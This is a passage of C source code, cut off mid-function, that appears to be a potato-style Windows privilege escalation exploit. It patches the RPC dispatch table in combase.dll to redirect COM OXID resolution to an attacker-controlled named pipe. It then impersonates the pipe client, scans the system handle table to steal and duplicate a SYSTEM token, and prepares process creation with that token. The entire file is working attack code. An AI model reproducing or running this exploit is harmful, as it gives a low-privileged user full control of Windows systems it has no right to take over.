#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <sddl.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <objbase.h>
#include <objidl.h>
#include "Native.h"

#define NT_SUCCESS(s)         ((NTSTATUS)(s) >= 0)
#define STATUS_INFO_LENGTH_MISMATCH 0xC0000004
#define STATUS_BUFFER_TOO_SMALL 0xC0000023

#define OBJ_CASE_INSENSITIVE  0x40UL
#define HEAP_ZERO_MEMORY      0x00000008

#define TOKEN_ELEVATION_QUERY 0x0020
#define TOKEN_DUPLICATE       0x0002
#define TOKEN_QUERY           0x0008
#define TOKEN_IMPERSONATE     0x0004
#define TOKEN_ASSIGN_PRIMARY  0x0001
#define TOKEN_ALL_ACCESS_P    0x000F01FF

#define PROCESS_DUP_HANDLE         0x0040
#define PROCESS_QUERY_INFORMATION  0x0400

#define HANDLE_FLAG_INHERIT   0x00000001

#define SecurityDelegation    4
#define SecurityImpersonation 2
#define TokenPrimary          1
#define TokenImpersonation    2

#define TokenUser             1
#define TokenType             8
#define TokenImpersonationLevel 9
#define TokenIntegrityLevel   25
#define TokenElevationType    18

#define TokenElevationTypeFull    2

#define OBJECT_TYPE_TOKEN     0x05

#define CREATE_NO_WINDOW           0x08000000
#define CREATE_UNICODE_ENVIRONMENT 0x00000400
#define STARTF_USESTDHANDLES       0x00000100

typedef LONG NTSTATUS;

#define SystemHandleInformation 16

#define SECURITY_MANDATORY_SYSTEM_RID  0x4000

/* ORCB IID: 18f70770-8e64-11cf-9af1-0020af6e72f4 */
static const GUID ORCB_GUID = {
    0x18f70770, 0x8e64, 0x11cf,
    { 0x9a, 0xf1, 0x00, 0x20, 0xaf, 0x6e, 0x72, 0xf4 }
};

/* IUnknown IID for CoUnmarshalInterface */
static const IID IID_IUnknown_val = {
    0x00000000, 0x0000, 0x0000,
    { 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 }
};

typedef NTSTATUS (NTAPI *pfnNtOpenProcess)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID);
typedef NTSTATUS (NTAPI *pfnNtClose)(HANDLE);
typedef NTSTATUS (NTAPI *pfnNtOpenProcessToken)(HANDLE, ACCESS_MASK, PHANDLE);
typedef NTSTATUS (NTAPI *pfnNtDuplicateObject)(HANDLE, HANDLE, HANDLE, PHANDLE, ACCESS_MASK, ULONG, ULONG);
typedef NTSTATUS (NTAPI *pfnNtDuplicateToken)(HANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, BOOLEAN, TOKEN_TYPE, PHANDLE);
typedef NTSTATUS (NTAPI *pfnNtQuerySystemInformation)(ULONG, PVOID, ULONG, PULONG);
typedef NTSTATUS (NTAPI *pfnNtQueryInformationToken)(HANDLE, ULONG, PVOID, ULONG, PULONG);
typedef NTSTATUS (NTAPI *pfnNtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS (NTAPI *pfnNtWaitForSingleObject)(HANDLE, BOOLEAN, PLARGE_INTEGER);
typedef NTSTATUS (NTAPI *pfnNtReadFile)(HANDLE, HANDLE, PVOID, PVOID, PIO_STATUS_BLOCK, PVOID, ULONG, PLARGE_INTEGER, PULONG);
typedef NTSTATUS (NTAPI *pfnNtSetInformationObject)(HANDLE, ULONG, PVOID, ULONG);
typedef NTSTATUS (NTAPI *pfnNtQueryObject)(HANDLE, ULONG, PVOID, ULONG, PULONG);
typedef NTSTATUS (NTAPI *pfnNtCreateNamedPipeFile)(PHANDLE, ULONG, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, ULONG, ULONG, ULONG, ULONG, ULONG, ULONG, ULONG, ULONG, ULONG, PLARGE_INTEGER);

typedef BOOL (WINAPI *pfnCreateProcessWithTokenW)(HANDLE, DWORD, LPCWSTR, LPWSTR, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);

static pfnNtOpenProcess              _NtOpenProcess              = NULL;
static pfnNtClose                    _NtClose                    = NULL;
static pfnNtOpenProcessToken         _NtOpenProcessToken         = NULL;
static pfnNtDuplicateObject          _NtDuplicateObject          = NULL;
static pfnNtDuplicateToken           _NtDuplicateToken           = NULL;
static pfnNtQuerySystemInformation   _NtQuerySystemInformation   = NULL;
static pfnNtQueryInformationToken    _NtQueryInformationToken    = NULL;
static pfnNtProtectVirtualMemory     _NtProtectVirtualMemory     = NULL;
static pfnNtWaitForSingleObject      _NtWaitForSingleObject      = NULL;
static pfnNtReadFile                 _NtReadFile                 = NULL;
static pfnNtSetInformationObject     _NtSetInformationObject     = NULL;
static pfnNtQueryObject              _NtQueryObject              = NULL;
static pfnNtCreateNamedPipeFile      _NtCreateNamedPipeFile      = NULL;
static pfnCreateProcessWithTokenW    _CreateProcessWithTokenW    = NULL;

static BOOL ResolveApis(void) {
    HMODULE hNtdll    = GetModuleHandleA("ntdll.dll");
    HMODULE hAdvapi32 = GetModuleHandleA("advapi32.dll");
    if (!hNtdll || !hAdvapi32) {
        fprintf(stderr, "[-] Failed to get module handles\n");
        return FALSE;
    }

#define RESOLVE_NT(name) \
    _##name = (pfn##name)GetProcAddress(hNtdll, #name); \
    if (!_##name) { fprintf(stderr, "[-] Failed to resolve %s\n", #name); return FALSE; }

    RESOLVE_NT(NtOpenProcess)
    RESOLVE_NT(NtClose)
    RESOLVE_NT(NtOpenProcessToken)
    RESOLVE_NT(NtDuplicateObject)
    RESOLVE_NT(NtDuplicateToken)
    RESOLVE_NT(NtQuerySystemInformation)
    RESOLVE_NT(NtQueryInformationToken)
    RESOLVE_NT(NtProtectVirtualMemory)
    RESOLVE_NT(NtWaitForSingleObject)
    RESOLVE_NT(NtReadFile)
    RESOLVE_NT(NtSetInformationObject)
    RESOLVE_NT(NtQueryObject)
    RESOLVE_NT(NtCreateNamedPipeFile)
#undef RESOLVE_NT

    _CreateProcessWithTokenW = (pfnCreateProcessWithTokenW)GetProcAddress(hAdvapi32, "CreateProcessWithTokenW");
    if (!_CreateProcessWithTokenW) {
        fprintf(stderr, "[-] Failed to resolve CreateProcessWithTokenW\n");
        return FALSE;
    }

    return TRUE;
}

static PVOID GetModuleBaseAndSize(const char *name, SIZE_T *outSize) {
    HMODULE hMod = LoadLibraryA(name);
    if (!hMod) return NULL;

    BYTE *base = (BYTE*)hMod;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER*)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;

    if (outSize) *outSize = nt->OptionalHeader.SizeOfImage;
    return base;
}

static SIZE_T *SundaySearch(const BYTE *haystack, SIZE_T hLen,
                             const BYTE *needle,   SIZE_T nLen,
                             SIZE_T *outCount) {
    *outCount = 0;
    if (nLen == 0 || hLen < nLen) return NULL;

    SIZE_T shift[256];
    for (int i = 0; i < 256; i++) shift[i] = nLen + 1;
    for (SIZE_T i = 0; i < nLen; i++) shift[needle[i]] = nLen - i;

    SIZE_T capacity = 16;
    SIZE_T *results = (SIZE_T*)malloc(capacity * sizeof(SIZE_T));
    if (!results) return NULL;

    SIZE_T pos = 0;
    while (pos + nLen <= hLen) {
        if (memcmp(haystack + pos, needle, nLen) == 0) {
            if (*outCount >= capacity) {
                capacity *= 2;
                SIZE_T *tmp = (SIZE_T*)realloc(results, capacity * sizeof(SIZE_T));
                if (!tmp) { free(results); return NULL; }
                results = tmp;
            }
            results[(*outCount)++] = pos;
        }
        if (pos + nLen < hLen)
            pos += shift[haystack[pos + nLen]];
        else
            break;
    }
    return results;
}

typedef struct _HOOK_CTX {
    PVOID        *DispatchTablePtr; 
    PVOID         OriginalFn;       
    UINT          ParamCount;       
    BOOL          Hooked;
    WCHAR         ClientPipeW[256];
} HOOK_CTX;

static HOOK_CTX g_HookCtx;

static int __stdcall HookCore(void **ppDsaNewBindings, void *ppDsaNewSecurity) {
    (void)ppDsaNewSecurity;

    static const char tcpEp[] = "ncacn_ip_tcp:safe !";

    char pipeAnsi[256] = {0};
    WideCharToMultiByte(CP_ACP, 0, g_HookCtx.ClientPipeW, -1, pipeAnsi, sizeof(pipeAnsi), NULL, NULL);

    SIZE_T ep0Len = strlen(pipeAnsi);
    SIZE_T ep1Len = strlen(tcpEp);

    // entrieSize = 3 + len(ep0)+1 + len(ep1)+1  (WCHAR units)
    SIZE_T entrieSize = 3 + ep0Len + 1 + ep1Len + 1;
    SIZE_T memSize    = entrieSize * 2 + 10;

    BYTE *buf = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, memSize);
    if (!buf) return -1;

    *(INT16*)(buf + 0) = (INT16)entrieSize;
    *(INT16*)(buf + 2) = (INT16)(entrieSize - 2);

    SIZE_T off = 4;

    for (SIZE_T i = 0; i < ep0Len; i++) {
        *(UINT16*)(buf + off) = (UINT16)(unsigned char)pipeAnsi[i];
        off += 2;
    }
    off += 2; /* null terminate */

    for (SIZE_T i = 0; i < ep1Len; i++) {
        *(UINT16*)(buf + off) = (UINT16)(unsigned char)tcpEp[i];
        off += 2;
    }
    off += 2; /* null terminate */

    *ppDsaNewBindings = buf;
    return 0;
}

static int __stdcall Hook4 (void*a,void*b,void*c,void*d)                                              { (void)a;(void)b; return HookCore((void**)c, d); }
static int __stdcall Hook5 (void*a,void*b,void*c,void*d,void*e)                                       { (void)a;(void)b;(void)c; return HookCore((void**)d, e); }
static int __stdcall Hook6 (void*a,void*b,void*c,void*d,void*e,void*f)                                { (void)a;(void)b;(void)c;(void)d; return HookCore((void**)e, f); }
static int __stdcall Hook7 (void*a,void*b,void*c,void*d,void*e,void*f,void*g)                         { (void)a;(void)b;(void)c;(void)d;(void)e; return HookCore((void**)f, g); }
static int __stdcall Hook8 (void*a,void*b,void*c,void*d,void*e,void*f,void*g,void*h)                  { (void)a;(void)b;(void)c;(void)d;(void)e;(void)f; return HookCore((void**)g, h); }
static int __stdcall Hook9 (void*a,void*b,void*c,void*d,void*e,void*f,void*g,void*h,void*i)           { (void)a;(void)b;(void)c;(void)d;(void)e;(void)f;(void)g; return HookCore((void**)h, i); }
static int __stdcall Hook10(void*a,void*b,void*c,void*d,void*e,void*f,void*g,void*h,void*i,void*j)    { (void)a;(void)b;(void)c;(void)d;(void)e;(void)f;(void)g;(void)h; return HookCore((void**)i, j); }
static int __stdcall Hook11(void*a,void*b,void*c,void*d,void*e,void*f,void*g,void*h,void*i,void*j,void*k)           { (void)a;(void)b;(void)c;(void)d;(void)e;(void)f;(void)g;(void)h;(void)i; return HookCore((void**)j, k); }
static int __stdcall Hook12(void*a,void*b,void*c,void*d,void*e,void*f,void*g,void*h,void*i,void*j,void*k,void*l)    { (void)a;(void)b;(void)c;(void)d;(void)e;(void)f;(void)g;(void)h;(void)i;(void)j; return HookCore((void**)k, l); }
static int __stdcall Hook13(void*a,void*b,void*c,void*d,void*e,void*f,void*g,void*h,void*i,void*j,void*k,void*l,void*m) { (void)a;(void)b;(void)c;(void)d;(void)e;(void)f;(void)g;(void)h;(void)i;(void)j;(void)k; return HookCore((void**)l, m); }
static int __stdcall Hook14(void*a,void*b,void*c,void*d,void*e,void*f,void*g,void*h,void*i,void*j,void*k,void*l,void*m,void*n) { (void)a;(void)b;(void)c;(void)d;(void)e;(void)f;(void)g;(void)h;(void)i;(void)j;(void)k;(void)l; return HookCore((void**)m, n); }

static PVOID SelectHookFn(UINT paramCount) {
    switch (paramCount) {
        case  4: return Hook4;
        case  5: return Hook5;
        case  6: return Hook6;
        case  7: return Hook7;
        case  8: return Hook8;
        case  9: return Hook9;
        case 10: return Hook10;
        case 11: return Hook11;
        case 12: return Hook12;
        case 13: return Hook13;
        case 14: return Hook14;
        default: return NULL;
    }
}

static BOOL InitContext(void) {
    SIZE_T modSize = 0;
    BYTE *modBase = (BYTE*)GetModuleBaseAndSize("combase.dll", &modSize);
    if (!modBase || modSize == 0) {
        fprintf(stderr, "[-] Could not locate combase.dll\n");
        return FALSE;
    }
    printf("[+] combase.dll: 0x%p  size: %zu\n", modBase, modSize);

    /*
     * Pattern:
     *  [4 bytes] sizeof(RPC_SERVER_INTERFACE) LE
     *  [16 bytes] ORCB_GUID LE (Data1 LE32, Data2 LE16, Data3 LE16, Data4[8])
     */
    BYTE pattern[4 + 16];
    UINT rsiSize = (UINT)sizeof(RPC_SERVER_INTERFACE);
    memcpy(pattern, &rsiSize, 4);

    DWORD d1 = ORCB_GUID.Data1;
    WORD  d2 = ORCB_GUID.Data2;
    WORD  d3 = ORCB_GUID.Data3;
    memcpy(pattern + 4,  &d1, 4);
    memcpy(pattern + 8,  &d2, 2);
    memcpy(pattern + 10, &d3, 2);
    memcpy(pattern + 12, ORCB_GUID.Data4, 8);

    SIZE_T matchCount = 0;
    SIZE_T *matches = SundaySearch(modBase, modSize, pattern, sizeof(pattern), &matchCount);
    if (!matches || matchCount == 0) {
        fprintf(stderr, "[-] RPC_SERVER_INTERFACE not found in combase.dll\n");
        free(matches);
        return FALSE;
    }
    printf("[+] RPC_SERVER_INTERFACE at offset 0x%zx\n", matches[0]);

    RPC_SERVER_INTERFACE *rsi = (RPC_SERVER_INTERFACE*)(modBase + matches[0]);
    free(matches);

    RPC_DISPATCH_TABLE  *rdt  = rsi->DispatchTable;
    MIDL_SERVER_INFO    *msi  = (MIDL_SERVER_INFO*)rsi->InterpreterInfo;

    printf("[+] DispatchTable:   0x%p\n", (void*)rdt);
    printf("[+] InterpreterInfo: 0x%p\n", (void*)msi);

    g_HookCtx.DispatchTablePtr = (PVOID*)msi->DispatchTable;
    g_HookCtx.OriginalFn       = g_HookCtx.DispatchTablePtr[0];

    PUCHAR procStr  = msi->ProcString;
    USHORT offset0  = msi->FmtStringOffset[0];
    g_HookCtx.ParamCount = *(UCHAR*)(procStr + offset0 + 19);

    printf("[+] UseProtseq param count: %u\n", g_HookCtx.ParamCount);

    lstrcpyW(g_HookCtx.ClientPipeW,
             L"ncacn_np:localhost/pipe/Cotato[\\pipe\\epmapper]");

    return TRUE;
}

static BOOL HookRpc(void) {
    PVOID hookFn = SelectHookFn(g_HookCtx.ParamCount);
    if (!hookFn) {
        fprintf(stderr, "[-] Unsupported param count %u\n", g_HookCtx.ParamCount);
        return FALSE;
    }

    HANDLE hProc   = (HANDLE)(LONG_PTR)-1;
    PVOID  addr    = g_HookCtx.DispatchTablePtr;
    SIZE_T sz      = sizeof(PVOID);
    ULONG  oldProt = 0;

    NTSTATUS st = _NtProtectVirtualMemory(hProc, &addr, &sz, PAGE_EXECUTE_READWRITE, &oldProt);
    if (!NT_SUCCESS(st)) {
        fprintf(stderr, "[-] NtProtectVirtualMemory failed: 0x%08X\n", st);
        return FALSE;
    }

    g_HookCtx.DispatchTablePtr[0] = hookFn;
    g_HookCtx.Hooked = TRUE;
    printf("[+] RPC hook installed\n");
    return TRUE;
}

static void RestoreRpc(void) {
    if (g_HookCtx.Hooked) {
        g_HookCtx.DispatchTablePtr[0] = g_HookCtx.OriginalFn;
        g_HookCtx.Hooked = FALSE;
        printf("[+] RPC hook restored\n");
    }
}

static DWORD GetTokenIntegrityRID(HANDLE hToken) {
    ULONG needed = 0;
    _NtQueryInformationToken(hToken, TokenIntegrityLevel, NULL, 0, &needed);
    if (needed == 0) return 0;

    BYTE *buf = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, needed);
    if (!buf) return 0;

    NTSTATUS st = _NtQueryInformationToken(hToken, TokenIntegrityLevel, buf, needed, &needed);
    DWORD rid = 0;
    if (NT_SUCCESS(st)) {
        TOKEN_MANDATORY_LABEL *tml = (TOKEN_MANDATORY_LABEL*)buf;
        DWORD subCount = *GetSidSubAuthorityCount(tml->Label.Sid);
        rid = *GetSidSubAuthority(tml->Label.Sid, subCount - 1);
    }
    HeapFree(GetProcessHeap(), 0, buf);
    return rid;
}

static BOOL IsSystemToken(HANDLE hToken) {
    ULONG needed = 0;
    _NtQueryInformationToken(hToken, TokenUser, NULL, 0, &needed);
    if (needed == 0) return FALSE;

    BYTE *buf = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, needed);
    if (!buf) return FALSE;

    NTSTATUS st = _NtQueryInformationToken(hToken, TokenUser, buf, needed, &needed);
    BOOL result = FALSE;
    if (NT_SUCCESS(st)) {
        TOKEN_USER *tu = (TOKEN_USER*)buf;
        SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
        PSID systemSid = NULL;
        if (AllocateAndInitializeSid(&ntAuth, 1, SECURITY_LOCAL_SYSTEM_RID,
                                     0,0,0,0,0,0,0, &systemSid)) {
            result = EqualSid(tu->User.Sid, systemSid);
            FreeSid(systemSid);
        }
    }
    HeapFree(GetProcessHeap(), 0, buf);
    return result;
}

static int GetTokenImpersonationLevel(HANDLE hToken) {
    SECURITY_IMPERSONATION_LEVEL lvl = 0;
    ULONG needed = 0;
    NTSTATUS st = _NtQueryInformationToken(hToken, TokenImpersonationLevel, &lvl, sizeof(lvl), &needed);
    if (!NT_SUCCESS(st)) return -1;
    return (int)lvl;
}

static int GetTokenType(HANDLE hToken) {
    TOKEN_TYPE tt = 0;
    ULONG needed  = 0;
    NTSTATUS st   = _NtQueryInformationToken(hToken, (ULONG)TokenType, &tt, sizeof(tt), &needed);
    if (!NT_SUCCESS(st)) return -1;
    return (int)tt;
}

static HANDLE DuplicateAsPrimary(HANDLE hToken) {
    OBJECT_ATTRIBUTES oa = {0};
    oa.Length = sizeof(oa);
    HANDLE hDup = NULL;
    NTSTATUS st = _NtDuplicateToken(
        hToken,
        TOKEN_ALL_ACCESS_P,
        &oa,
        FALSE,
        (TOKEN_TYPE)TokenPrimary,
        &hDup
    );
    if (!NT_SUCCESS(st)) return NULL;
    return hDup;
}

static PSYSTEM_HANDLE_INFORMATION GetSystemHandles(void) {
    ULONG size = 0x10000;
    PSYSTEM_HANDLE_INFORMATION info = NULL;
    NTSTATUS st;
    for (;;) {
        info = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size);
        if (!info) return NULL;
        st = _NtQuerySystemInformation(SystemHandleInformation, info, size, &size);
        if (NT_SUCCESS(st)) break;
        HeapFree(GetProcessHeap(), 0, info);
        info = NULL;
        if (st == STATUS_INFO_LENGTH_MISMATCH) { size *= 2; continue; }
        break;
    }
    return info;
}

static HANDLE OpenProcessById(DWORD pid, ACCESS_MASK access) {
    OBJECT_ATTRIBUTES oa = {0};
    oa.Length = sizeof(oa);
    CLIENT_ID cid = {0};
    cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
    HANDLE hProc = NULL;
    _NtOpenProcess(&hProc, access, &oa, &cid);
    return hProc;
}

typedef struct _PIPE_CTX {
    WCHAR  PipeName[256];
    HANDLE hSystemToken; /* out: duplicated primary SYSTEM token */
    HANDLE hReady;       /* event signalled when search is done  */
} PIPE_CTX;

static DWORD WINAPI PipeServerThread(LPVOID param) {
    PIPE_CTX *ctx = (PIPE_CTX*)param;
    ctx->hSystemToken = NULL;

    PSECURITY_DESCRIPTOR pSd = NULL;
    ULONG sdSize = 0;
    if (!ConvertStringSecurityDescriptorToSecurityDescriptorW(
            L"D:(A;OICI;GA;;;WD)", SDDL_REVISION_1, &pSd, &sdSize)) {
        fprintf(stderr, "[-] ConvertStringSecurityDescriptorToSecurityDescriptor failed: %lu\n", GetLastError());
        SetEvent(ctx->hReady);
        return 1;
    }

    SECURITY_ATTRIBUTES sa = {0};
    sa.nLength              = sizeof(sa);
    sa.lpSecurityDescriptor = pSd;
    sa.bInheritHandle       = FALSE;

    HANDLE hPipe = CreateNamedPipeW(
        ctx->PipeName,
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
        255, 521, 0, 123, &sa
    );
    LocalFree(pSd);

    if (hPipe == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "[-] CreateNamedPipeW failed: %lu\n", GetLastError());
        SetEvent(ctx->hReady);
        return 1;
    }
    printf("[+] Named pipe: %ls\n", ctx->PipeName);

    BOOL connected = ConnectNamedPipe(hPipe, NULL);
    if (!connected && GetLastError() != ERROR_PIPE_CONNECTED) {
        fprintf(stderr, "[-] ConnectNamedPipe failed: %lu\n", GetLastError());
        CloseHandle(hPipe);
        SetEvent(ctx->hReady);
        return 1;
    }
    printf("[+] Pipe client connected\n");

    if (!ImpersonateNamedPipeClient(hPipe)) {
        fprintf(stderr, "[-] ImpersonateNamedPipeClient failed: %lu\n", GetLastError());
        CloseHandle(hPipe);
        SetEvent(ctx->hReady);
        return 1;
    }
    printf("[+] Impersonation OK - scanning for SYSTEM token\n");

    PSYSTEM_HANDLE_INFORMATION shi = GetSystemHandles();
    if (shi) {
        DWORD  lastPid  = 0;
        HANDLE hProc    = NULL;
        HANDLE hCurrent = (HANDLE)(LONG_PTR)-1;

        for (ULONG i = 0; i < shi->NumberOfHandles && ctx->hSystemToken == NULL; i++) {
            SYSTEM_HANDLE_TABLE_ENTRY_INFO *e = &shi->Handles[i];
            DWORD pid = e->UniqueProcessId;

            if (pid != lastPid) {
                if (hProc) { _NtClose(hProc); hProc = NULL; }
                hProc   = OpenProcessById(pid, PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION);
                lastPid = pid;

                if (hProc) {
                    /* Check primary process token first */
                    HANDLE hProcTok = NULL;
                    if (NT_SUCCESS(_NtOpenProcessToken(hProc, TOKEN_QUERY | TOKEN_DUPLICATE, &hProcTok))) {
                        if (IsSystemToken(hProcTok)) {
                            DWORD rid  = GetTokenIntegrityRID(hProcTok);
                            int   itype = GetTokenType(hProcTok);
                            int   ilvl  = (itype == TokenImpersonation)
                                          ? GetTokenImpersonationLevel(hProcTok)
                                          : SecurityImpersonation;
                            if (ilvl >= SecurityImpersonation && rid >= SECURITY_MANDATORY_SYSTEM_RID) {
                                HANDLE hDup = DuplicateAsPrimary(hProcTok);
                                if (hDup) {
                                    printf("[+] Found SYSTEM primary token (PID %lu)\n", pid);
                                    ctx->hSystemToken = hDup;
                                    _NtClose(hProcTok);
                                    break;
                                }
                            }
                        }
                        _NtClose(hProcTok);
                    }
                }
            }

            if (!hProc) continue;
            if (e->ObjectTypeIndex != OBJECT_TYPE_TOKEN) continue;
            if (e->GrantedAccess   == 0x0012019F)         continue;

            HANDLE hDup = NULL;
            NTSTATUS st = _NtDuplicateObject(
                hProc,
                (HANDLE)(ULONG_PTR)e->HandleValue,
                hCurrent,
                &hDup,
                TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE,
                0, 0
            );
            if (!NT_SUCCESS(st) || !hDup) continue;

            if (IsSystemToken(hDup)) {
                int  itype = GetTokenType(hDup);
                int  ilvl  = (itype == TokenImpersonation)
                             ? GetTokenImpersonationLevel(hDup)
                             : SecurityImpersonation;
                DWORD rid = GetTokenIntegrityRID(hDup);

                if (ilvl >= SecurityImpersonation && rid >= SECURITY_MANDATORY_SYSTEM_RID) {
                    HANDLE hPrim = DuplicateAsPrimary(hDup);
                    _NtClose(hDup);
                    if (hPrim) {
                        printf("[+] SYSTEM token found (PID %lu, handle 0x%X)\n",
                               pid, e->HandleValue);
                        ctx->hSystemToken = hPrim;
                        break;
                    }
                    continue;
                }
            }
            _NtClose(hDup);
        }

        if (hProc) _NtClose(hProc);
        HeapFree(GetProcessHeap(), 0, shi);
    }

    RevertToSelf();
    CloseHandle(hPipe);
    SetEvent(ctx->hReady);
    return 0;
}

static const signed char b64dec[256] = {
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,62,-1,-1,-1,63,
    52,53,54,55,56,57,58,59,60,61,-1,-1,-1, 0,-1,-1,
    -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9,10,11,12,13,14,
    15,16,17,18,19,20,21,22,23,24,25,-1,-1,-1,-1,-1,
    -1,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,
    41,42,43,44,45,46,47,48,49,50,51,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1
};

static BYTE *Base64Decode(const char *src, SIZE_T *outLen) {
    SIZE_T srcLen = strlen(src);
    SIZE_T maxOut = (srcLen * 3) / 4 + 4;
    BYTE *out = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, maxOut);
    if (!out) return NULL;

    SIZE_T j = 0;
    UINT   acc = 0;
    int    bits = 0;
    for (SIZE_T i = 0; i < srcLen; i++) {
        signed char v = b64dec[(unsigned char)src[i]];
        if (v < 0) continue;
        acc  = (acc << 6) | (unsigned)v;
        bits += 6;
        if (bits >= 8) {
            bits -= 8;
            out[j++] = (BYTE)(acc >> bits);
        }
    }
    *outLen = j;
    return out;
}

static inline UINT16  ru16(const BYTE *b, SIZE_T *o) { UINT16 v=(UINT16)b[*o]|((UINT16)b[*o+1]<<8);       *o+=2; return v; }
static inline UINT32  ru32(const BYTE *b, SIZE_T *o) { UINT32 v=ru16(b,o); v|=(UINT32)ru16(b,o)<<16;      return v; }
static inline UINT64  ru64(const BYTE *b, SIZE_T *o) { UINT64 v=ru32(b,o); v|=(UINT64)ru32(b,o)<<32;      return v; }
static inline void    wu16(BYTE *b, SIZE_T *o, UINT16 v){ b[*o]=(BYTE)v; b[*o+1]=(BYTE)(v>>8); *o+=2; }
static inline void    wu32(BYTE *b, SIZE_T *o, UINT32 v){ wu16(b,o,(UINT16)v); wu16(b,o,(UINT16)(v>>16)); }
static inline void    wu64(BYTE *b, SIZE_T *o, UINT64 v){ wu32(b,o,(UINT32)v); wu32(b,o,(UINT32)(v>>32)); }

typedef struct IFakeUnknown IFakeUnknown;
typedef struct IFakeUnknownVtbl {
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(IFakeUnknown*, REFIID, void**);
    ULONG   (STDMETHODCALLTYPE *AddRef)(IFakeUnknown*);
    ULONG   (STDMETHODCALLTYPE *Release)(IFakeUnknown*);
} IFakeUnknownVtbl;
struct IFakeUnknown { IFakeUnknownVtbl *lpVtbl; LONG refCount; };

static HRESULT STDMETHODCALLTYPE FakeQI(IFakeUnknown *self, REFIID riid, void **ppv) {
    if (IsEqualGUID(riid, &IID_IUnknown_val)) { *ppv=self; InterlockedIncrement(&self->refCount); return S_OK; }
    *ppv=NULL; return E_NOINTERFACE;
}
static ULONG STDMETHODCALLTYPE FakeAddRef (IFakeUnknown *s) { return (ULONG)InterlockedIncrement(&s->refCount); }
static ULONG STDMETHODCALLTYPE FakeRelease(IFakeUnknown *s) { return (ULONG)InterlockedDecrement(&s->refCount); }
static IFakeUnknownVtbl g_FakeVtbl = { FakeQI, FakeAddRef, FakeRelease };

typedef HRESULT (STDAPICALLTYPE *pfnCoUnmarshalInterface)(IStream*, REFIID, LPVOID*);
typedef HRESULT (STDAPICALLTYPE *pfnCreateStreamOnHGlobal)(HGLOBAL, BOOL, IStream**);
typedef HRESULT (STDAPICALLTYPE *pfnCreateObjrefMoniker)(LPUNKNOWN, IMoniker**);
typedef HRESULT (STDAPICALLTYPE *pfnCreateBindCtx)(DWORD, IBindCtx**);
typedef HRESULT (STDAPICALLTYPE *pfnCoInitializeEx)(LPVOID, DWORD);
typedef void    (STDAPICALLTYPE *pfnCoUninitialize)(void);

static pfnCoUnmarshalInterface  _CoUnmarshalInterface  = NULL;
static pfnCreateStreamOnHGlobal _CreateStreamOnHGlobal = NULL;
static pfnCreateObjrefMoniker   _CreateObjrefMoniker   = NULL;
static pfnCreateBindCtx         _CreateBindCtx_        = NULL;
static pfnCoInitializeEx        _CoInitializeEx        = NULL;
static pfnCoUninitialize        _CoUninitialize        = NULL;

static BOOL ResolveCOMApis(void) {
    HMODULE hOle32 = LoadLibraryA("ole32.dll");
    if (!hOle32) return FALSE;
#define RCOM(name) _##name = (pfn##name)GetProcAddress(hOle32, #name); \
    if(!_##name){fprintf(stderr,"[-] %s not found\n",#name);return FALSE;}
    RCOM(CoUnmarshalInterface)
    RCOM(CreateStreamOnHGlobal)
    RCOM(CreateObjrefMoniker)
    RCOM(CoInitializeEx)
    RCOM(CoUninitialize)
#undef RCOM
    _CreateBindCtx_ = (pfnCreateBindCtx)GetProcAddress(hOle32, "CreateBindCtx");
    if (!_CreateBindCtx_) { fprintf(stderr, "[-] CreateBindCtx not found\n"); return FALSE; }
    return TRUE;
}

/*
 * Build modified OBJREF bytes:
 *  - Replaces GUID with IUnknown IID
 *  - Keeps oxid, oid, ipid from the original
 *  - StringBinding -> ncacn_ip_tcp + "127.0.0.1"
 *  - SecurityBinding -> authn=0x0a, authz=0xFFFF, no principal
 */
static BYTE *BuildObjRef(const BYTE *orig, SIZE_T origLen, SIZE_T *outLen) {
